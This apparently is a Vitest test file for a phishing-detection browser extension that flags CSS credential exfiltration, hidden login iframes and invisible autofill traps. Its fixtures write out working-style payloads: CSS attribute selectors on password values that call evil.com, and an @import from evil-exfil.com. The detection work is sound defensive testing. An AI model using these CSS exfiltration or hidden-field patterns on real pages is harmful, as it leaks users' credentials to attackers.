/**
 * extension/__tests__/style_auditor.test.js
 *
 * Tests for StyleAuditor — CSS Credential Exfiltration + LOTL DOM Camouflage
 */

import { describe, it, expect, afterEach, vi } from 'vitest';
import { JSDOM } from 'jsdom';
import '../content/style_auditor.js';
const { checkCssExfilAttributeSelector, checkHiddenIframeCredentialLoad, checkInvisibleFormAutofillTrap, checkCssImportExfilChain, checkDynamicStyleInjection, calculateStyleRiskScore, injectStyleWarningBanner } = globalThis.__phishopsExports['style_auditor'];

function makeDoc(html = '<html><head></head><body></body></html>') {
  const dom = new JSDOM(html);
  return dom.window.document;
}

afterEach(() => {
  vi.unstubAllGlobals();
});

/* ================================================================== */
/*  checkCssExfilAttributeSelector                                      */
/* ================================================================== */

describe('checkCssExfilAttributeSelector', () => {
  it('detects input[value^="a"] { background: url(...) } pattern', () => {
    const doc = makeDoc(`
      <html><head>
        <style>
          input[value^="a"] { background: url(https://evil.com/exfil?char=a); }
          input[value^="b"] { background: url(https://evil.com/exfil?char=b); }
        </style>
      </head><body></body></html>
    `);
    const signals = checkCssExfilAttributeSelector(doc);
    expect(signals).toHaveLength(1);
    expect(signals[0].id).toBe('style:css_exfil_attribute_selector');
    expect(signals[0].weight).toBe(0.40);
    expect(signals[0].source).toBe('inline_style');
  });

  it('detects password input value selector', () => {
    const doc = makeDoc(`
      <html><head>
        <style>
          input[type="password"][value^="p"] { background-image: url(https://evil.com/p); }
        </style>
      </head><body></body></html>
    `);
    expect(checkCssExfilAttributeSelector(doc)).toHaveLength(1);
  });

  it('detects [name="password"][value] selector', () => {
    const doc = makeDoc(`
      <html><head>
        <style>
          [name="password"][value^="x"] { background: url(https://evil.com/x); }
        </style>
      </head><body></body></html>
    `);
    expect(checkCssExfilAttributeSelector(doc)).toHaveLength(1);
  });

  it('does NOT flag normal CSS without value selectors', () => {
    const doc = makeDoc(`
      <html><head>
        <style>
          input { border: 1px solid #ccc; }
          input:focus { border-color: blue; }
          .btn { background: url(/images/icon.png); }
        </style>
      </head><body></body></html>
    `);
    expect(checkCssExfilAttributeSelector(doc)).toHaveLength(0);
  });

  it('returns empty for null doc', () => {
    expect(checkCssExfilAttributeSelector(null)).toHaveLength(0);
  });
});

/* ================================================================== */
/*  checkHiddenIframeCredentialLoad                                     */
/* ================================================================== */

describe('checkHiddenIframeCredentialLoad', () => {
  it('detects opacity:0 iframe to auth provider', () => {
    const doc = makeDoc(`
      <html><body>
        <iframe src="https://login.microsoftonline.com/common/oauth2/authorize"
                style="opacity: 0; position: absolute;"></iframe>
      </body></html>
    `);
    const signals = checkHiddenIframeCredentialLoad(doc);
    expect(signals).toHaveLength(1);
    expect(signals[0].id).toBe('style:hidden_iframe_credential_load');
    expect(signals[0].weight).toBe(0.30);
  });

  it('detects clip-path:inset(100%) iframe to Google', () => {
    const doc = makeDoc(`
      <html><body>
        <iframe src="https://accounts.google.com/o/oauth2/auth"
                style="clip-path: inset(100%);"></iframe>
      </body></html>
    `);
    expect(checkHiddenIframeCredentialLoad(doc)).toHaveLength(1);
  });

  it('detects height:0 + overflow:hidden iframe to auth provider', () => {
    const doc = makeDoc(`
      <html><body>
        <iframe src="https://login.live.com/oauth2/authorize"
                style="height: 0; overflow: hidden;"></iframe>
      </body></html>
    `);
    expect(checkHiddenIframeCredentialLoad(doc)).toHaveLength(1);
  });

  it('detects zero-dimension iframe to auth provider', () => {
    const doc = makeDoc(`
      <html><body>
        <iframe src="https://login.microsoftonline.com/authorize" width="0" height="0"></iframe>
      </body></html>
    `);
    expect(checkHiddenIframeCredentialLoad(doc)).toHaveLength(1);
  });

  it('does NOT flag visible iframe to auth provider', () => {
    const doc = makeDoc(`
      <html><body>
        <iframe src="https://accounts.google.com/o/oauth2/auth"
                style="width: 400px; height: 300px;"></iframe>
      </body></html>
    `);
    expect(checkHiddenIframeCredentialLoad(doc)).toHaveLength(0);
  });

  it('does NOT flag hidden iframe to non-auth domain', () => {
    const doc = makeDoc(`
      <html><body>
        <iframe src="https://example.com/page" style="opacity: 0;"></iframe>
      </body></html>
    `);
    expect(checkHiddenIframeCredentialLoad(doc)).toHaveLength(0);
  });

  it('returns empty for null doc', () => {
    expect(checkHiddenIframeCredentialLoad(null)).toHaveLength(0);
  });
});

/* ================================================================== */
/*  checkInvisibleFormAutofillTrap                                      */
/* ================================================================== */

describe('checkInvisibleFormAutofillTrap', () => {
  it('detects opacity:0 password field', () => {
    const doc = makeDoc(`
      <html><body>
        <input type="password" style="opacity: 0;" />
      </body></html>
    `);
    const signals = checkInvisibleFormAutofillTrap(doc);
    expect(signals).toHaveLength(1);
    expect(signals[0].id).toBe('style:invisible_form_autofill_trap');
    expect(signals[0].weight).toBe(0.25);
  });

  it('detects clip-path:inset(100%) on email field', () => {
    const doc = makeDoc(`
      <html><body>
        <input type="email" style="clip-path: inset(100%);" />
      </body></html>
    `);
    expect(checkInvisibleFormAutofillTrap(doc)).toHaveLength(1);
  });

  it('detects off-screen positioned credential field', () => {
    const doc = makeDoc(`
      <html><body>
        <input type="password" style="position: absolute; left: -9999px;" />
      </body></html>
    `);
    expect(checkInvisibleFormAutofillTrap(doc)).toHaveLength(1);
  });

  it('detects invisible parent of credential field', () => {
    const doc = makeDoc(`
      <html><body>
        <div style="opacity: 0;">
          <input type="password" />
        </div>
      </body></html>
    `);
    expect(checkInvisibleFormAutofillTrap(doc)).toHaveLength(1);
  });

  it('does NOT flag visible credential fields', () => {
    const doc = makeDoc(`
      <html><body>
        <input type="password" style="border: 1px solid blue;" />
      </body></html>
    `);
    expect(checkInvisibleFormAutofillTrap(doc)).toHaveLength(0);
  });

  it('does NOT flag invisible non-credential fields', () => {
    const doc = makeDoc(`
      <html><body>
        <input type="text" style="opacity: 0;" />
      </body></html>
    `);
    expect(checkInvisibleFormAutofillTrap(doc)).toHaveLength(0);
  });

  it('returns empty for null doc', () => {
    expect(checkInvisibleFormAutofillTrap(null)).toHaveLength(0);
  });
});

/* ================================================================== */
/*  checkCssImportExfilChain                                            */
/* ================================================================== */

describe('checkCssImportExfilChain', () => {
  it('detects @import to external domain', () => {
    const doc = makeDoc(`
      <html><head>
        <style>
          @import url('https://evil-exfil.com/steal.css');
        </style>
      </head><body></body></html>
    `);
    const signals = checkCssImportExfilChain(doc, 'legit-site.com');
    expect(signals).toHaveLength(1);
    expect(signals[0].id).toBe('style:css_import_exfil_chain');
    expect(signals[0].weight).toBe(0.20);
  });

  it('does NOT flag same-origin @import', () => {
    const doc = makeDoc(`
      <html><head>
        <style>
          @import url('https://legit-site.com/styles/main.css');
        </style>
      </head><body></body></html>
    `);
    expect(checkCssImportExfilChain(doc, 'legit-site.com')).toHaveLength(0);
  });

  it('does NOT flag styles without @import', () => {
    const doc = makeDoc(`
      <html><head>
        <style>body { color: black; }</style>
      </head><body></body></html>
    `);
    expect(checkCssImportExfilChain(doc, 'example.com')).toHaveLength(0);
  });

  it('returns empty for null inputs', () => {
    expect(checkCssImportExfilChain(null, 'test.com')).toHaveLength(0);
    expect(checkCssImportExfilChain(makeDoc(), null)).toHaveLength(0);
  });
});

/* ================================================================== */
/*  checkDynamicStyleInjection                                          */
/* ================================================================== */

describe('checkDynamicStyleInjection', () => {
  it('detects style element with exfil pattern', () => {
    const doc = makeDoc(`
      <html><head></head><body>
        <style>
          input[value^="x"] { background: url(https://evil.com/x); }
        </style>
      </body></html>
    `);
    const signals = checkDynamicStyleInjection(doc);
    expect(signals).toHaveLength(1);
    expect(signals[0].id).toBe('style:dynamic_style_injection');
    expect(signals[0].weight).toBe(0.15);
  });

  it('does NOT flag benign dynamic styles', () => {
    const doc = makeDoc(`
      <html><head></head><body>
        <style>
          .highlight { background-color: yellow; }
        </style>
      </body></html>
    `);
    expect(checkDynamicStyleInjection(doc)).toHaveLength(0);
  });

  it('returns empty for null doc', () => {
    expect(checkDynamicStyleInjection(null)).toHaveLength(0);
  });
});

/* ================================================================== */
/*  calculateStyleRiskScore                                             */
/* ================================================================== */

describe('calculateStyleRiskScore', () => {
  it('returns 0 for no signals', () => {
    expect(calculateStyleRiskScore([]).riskScore).toBe(0);
  });

  it('sums correctly', () => {
    const { riskScore } = calculateStyleRiskScore([
      { id: 'a', weight: 0.40 },
      { id: 'b', weight: 0.30 },
    ]);
    expect(riskScore).toBeCloseTo(0.70, 2);
  });

  it('caps at 1.0', () => {
    const signals = [
      { id: 'a', weight: 0.40 },
      { id: 'b', weight: 0.30 },
      { id: 'c', weight: 0.25 },
      { id: 'd', weight: 0.20 },
    ];
    expect(calculateStyleRiskScore(signals).riskScore).toBe(1.0);
  });
});

/* ================================================================== */
/*  injectStyleWarningBanner                                            */
/* ================================================================== */

describe('injectStyleWarningBanner', () => {
  it('injects banner into document', () => {
    const dom = new JSDOM('<html><head></head><body></body></html>');
    vi.stubGlobal('document', dom.window.document);

    injectStyleWarningBanner(0.70, [
      { id: 'style:css_exfil_attribute_selector', weight: 0.40 },
    ]);

    const banner = dom.window.document.getElementById('phishops-style-banner');
    expect(banner).not.toBeNull();
    expect(banner.textContent).toContain('CSS Credential Exfiltration');
  });

  it('does not inject duplicate banners', () => {
    const dom = new JSDOM('<html><head></head><body></body></html>');
    vi.stubGlobal('document', dom.window.document);

    const signals = [{ id: 'style:test', weight: 0.50 }];
    injectStyleWarningBanner(0.50, signals);
    injectStyleWarningBanner(0.50, signals);

    expect(dom.window.document.querySelectorAll('#phishops-style-banner')).toHaveLength(1);
  });
});
